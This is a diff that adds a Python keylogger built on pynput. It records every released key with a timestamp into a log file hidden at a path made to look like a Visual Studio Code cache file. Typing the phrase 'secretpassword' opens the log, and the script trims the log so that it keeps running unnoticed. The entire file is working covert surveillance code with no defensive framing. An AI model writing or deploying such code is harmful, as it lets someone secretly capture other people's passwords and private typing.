@@ -1,0 +1,55 @@
+import os
+from pynput.keyboard import Listener,Key
+import datetime
+
+path = r'C:\Users\User\AppData\Roaming\Code\Code Cache\wasm\index-dir\indexerLog.txt'
+
+array = []
+
+def on_release(Key):
+    key = str(Key)
+    try:
+        if key[0:3] == 'Key':
+            key = key[4:]
+    except:
+        pass
+    'f'
+    if key[0] == "'":
+        key = key[1:-1]
+    if key == 'space':
+        key = ' '
+
+    array.append(key)
+    date = datetime.datetime.now().strftime("%D %H:%M")
+    f = open(path,'a')
+    f.write('Key Logged at '+str(date)+': '+"'"+str(key)+"'\n")
+    f.close()
+
+    for i in range(len(array)):
+        try:
+            if array[i:i+14] == ['s','e','c','r','e','t','p','a','s','s','w','o','r','d']:
+                os.startfile(path)
+                array.clear()
+                break
+        except:
+            pass
+
+    f = open(path, 'r')
+    lines = f.readlines()
+    if len(lines) > 10000:
+        lines = lines[1000:]
+        f.close()
+        f = open(path, 'w')
+        f.truncate()
+        for line in lines:
+            f.write(line)
+        f.close()
+
+    else:
+        f.close()
+
+
+
+
+with Listener(on_release=on_release) as Listener:
+    Listener.join()
